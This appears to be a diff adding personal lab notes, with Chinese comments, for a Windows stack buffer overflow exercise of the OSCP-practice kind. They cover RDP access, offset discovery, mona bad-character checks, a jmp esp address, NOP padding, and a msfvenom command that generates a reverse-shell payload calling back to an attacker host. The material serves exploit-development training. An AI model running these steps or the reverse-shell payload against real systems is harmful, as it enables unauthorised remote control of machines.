@@ -1,0 +1,42 @@
+xfreerdp /u:admin /p:password /cert:ignore /v:10.10.127.14 /workarea
+
+生成指定长度不重复字节：（比fuzzing探测出来的字节长一点）
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 900
+
+EIP 35714234
+
+
+找到offiset
+
+!mona findmsp -distance 900
+
+!mona bytearray -b "\x00"
+
+ESP 019BFA30
+
+!mona compare -f C:\mona\oscp\bytearray.bin -a 019BFA30
+
+POSSIBLY BAD CHARS: 11,12,40,41,5f,60,b8,b9,ee,ef
+
+
+!mona bytearray -b "\x00\x11\x40\x5f\xb8\xee"
+
+
+
+ESP 019AFA30
+
+!mona compare -f C:\mona\oscp\bytearray.bin -a 019AFA30
+
+
+根据坏字节查找到可以利用的shellcode的静态地址
+!mona jmp -r esp -cpb "\x00\x11\x40\x5f\xb8\xee"
+
+
+找到静态地址：62501203
+
+retn = "\x03\x12\x50\x62"
+padding = "\x90" * 16
+
+
+生成shellcode:
+msfvenom -p windows/shell_reverse_tcp LHOST=10.17.9.218 LPORT=4444 EXITFUNC=thread -b "\x00\x11\x40\x5f\xb8\xee" -f c
